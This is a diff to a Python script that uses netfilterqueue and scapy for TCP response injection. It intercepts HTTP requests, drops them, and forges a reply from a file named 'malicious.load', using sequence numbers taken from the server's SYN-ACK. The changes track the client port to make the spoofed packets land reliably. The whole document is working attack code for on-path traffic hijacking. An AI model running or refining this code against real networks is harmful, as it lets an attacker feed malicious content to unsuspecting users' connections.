@@ -3,23 +3,24 @@ from netfilterqueue import NetfilterQueue
 import time, sys, threading, signal, scapy.all as scapy
 
 seq = 0
-seq_is_current = threading.Event()
+port = 0
 
 def examine_and_accept(pkt):
-	global seq, seq_is_current
-	ack_ip = scapy.IP(pkt.get_payload())
-	ack_tcp = ack_ip.payload
-	seq = ack_ip.seq + 1
+	global seq, port
+	synack_ip = scapy.IP(pkt.get_payload())
+	synack_tcp = synack_ip.payload
+	seq = synack_ip.seq + 1
+	port = synack_tcp.dport
 	pkt.accept()
-	seq_is_current.set()
 
 def drop_and_reply(pkt):
-	global seq, seq_is_current
-	print('hit!')
+	global seq, port
 	pkt.drop()
 	request_ip = scapy.IP(pkt.get_payload())
-	print(repr(request_ip))
 	request_tcp = request_ip.payload
+	if request_tcp.sport != port: return
+	else: response_tcp_seq = seq
+	print(repr(request_ip))
 	with open('malicious.load', 'rb') as f:
 		response_load = f.read()
 	response_load = response_load.replace(b'TIMESTRING',
@@ -27,9 +28,7 @@ def drop_and_reply(pkt):
 	response_tcp = scapy.TCP()/response_load
 	response_tcp.sport = 'http'
 	response_tcp.dport = request_tcp.sport
-	seq_is_current.wait()
-	seq_is_current.clear()
-	response_tcp.seq = seq
+	response_tcp.seq = response_tcp_seq
 	response_tcp.ack = request_tcp.seq + len(request_tcp.payload)
 	response_tcp.flags = 'PA'
 	response_ip = scapy.IP()/response_tcp
@@ -52,7 +51,5 @@ for qnum in callbacks:
 	thread = threading.Thread(target=binder, args=(qnum, callbacks[qnum]))
 	thread.daemon = True
 	thread.start()
-
 signal.signal(signal.SIGINT, handler)
-
-thread.join()
+while True: time.sleep(0.1)
